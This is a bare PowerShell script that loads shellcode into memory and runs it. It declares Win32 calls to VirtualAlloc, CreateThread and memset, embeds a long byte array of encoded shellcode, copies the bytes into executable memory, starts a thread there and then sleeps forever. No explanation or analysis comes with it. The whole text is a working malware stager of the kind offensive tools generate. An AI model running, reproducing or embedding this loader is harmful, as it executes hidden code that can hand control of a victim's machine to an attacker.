
$JM1 = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $JM1 -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbe,0x2e,0x0f,0xcf,0x3f,0xdb,0xc7,0xd9,0x74,0x24,0xf4,0x5b,0x33,0xc9,0xb1,0x47,0x31,0x73,0x13,0x83,0xc3,0x04,0x03,0x73,0x21,0xed,0x3a,0xc3,0xd5,0x73,0xc4,0x3c,0x25,0x14,0x4c,0xd9,0x14,0x14,0x2a,0xa9,0x06,0xa4,0x38,0xff,0xaa,0x4f,0x6c,0x14,0x39,0x3d,0xb9,0x1b,0x8a,0x88,0x9f,0x12,0x0b,0xa0,0xdc,0x35,0x8f,0xbb,0x30,0x96,0xae,0x73,0x45,0xd7,0xf7,0x6e,0xa4,0x85,0xa0,0xe5,0x1b,0x3a,0xc5,0xb0,0xa7,0xb1,0x95,0x55,0xa0,0x26,0x6d,0x57,0x81,0xf8,0xe6,0x0e,0x01,0xfa,0x2b,0x3b,0x08,0xe4,0x28,0x06,0xc2,0x9f,0x9a,0xfc,0xd5,0x49,0xd3,0xfd,0x7a,0xb4,0xdc,0x0f,0x82,0xf0,0xda,0xef,0xf1,0x08,0x19,0x8d,0x01,0xcf,0x60,0x49,0x87,0xd4,0xc2,0x1a,0x3f,0x31,0xf3,0xcf,0xa6,0xb2,0xff,0xa4,0xad,0x9d,0xe3,0x3b,0x61,0x96,0x1f,0xb7,0x84,0x79,0x96,0x83,0xa2,0x5d,0xf3,0x50,0xca,0xc4,0x59,0x36,0xf3,0x17,0x02,0xe7,0x51,0x53,0xae,0xfc,0xeb,0x3e,0xa6,0x31,0xc6,0xc0,0x36,0x5e,0x51,0xb2,0x04,0xc1,0xc9,0x5c,0x24,0x8a,0xd7,0x9b,0x4b,0xa1,0xa0,0x34,0xb2,0x4a,0xd1,0x1d,0x70,0x1e,0x81,0x35,0x51,0x1f,0x4a,0xc6,0x5e,0xca,0xe7,0xc3,0xc8,0x78,0x08,0x59,0x2e,0xeb,0xf5,0x5e,0x31,0x7b,0x70,0xb8,0x1d,0x2b,0xd3,0x15,0xdd,0x9b,0x93,0xc5,0xb5,0xf1,0x1b,0x39,0xa5,0xf9,0xf1,0x52,0x4f,0x16,0xac,0x0b,0xe7,0x8f,0xf5,0xc0,0x96,0x50,0x20,0xad,0x98,0xdb,0xc7,0x51,0x56,0x2c,0xad,0x41,0x0e,0xdc,0xf8,0x38,0x98,0xe3,0xd6,0x57,0x24,0x76,0xdd,0xf1,0x73,0xee,0xdf,0x24,0xb3,0xb1,0x20,0x03,0xc8,0x78,0xb5,0xec,0xa6,0x84,0x59,0xed,0x36,0xd3,0x33,0xed,0x5e,0x83,0x67,0xbe,0x7b,0xcc,0xbd,0xd2,0xd0,0x59,0x3e,0x83,0x85,0xca,0x56,0x29,0xf0,0x3d,0xf9,0xd2,0xd7,0xbf,0xc5,0x04,0x11,0xca,0x27,0x95;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$BuC=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($BuC.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$BuC,0,0,0);for (;;){Start-sleep 60};

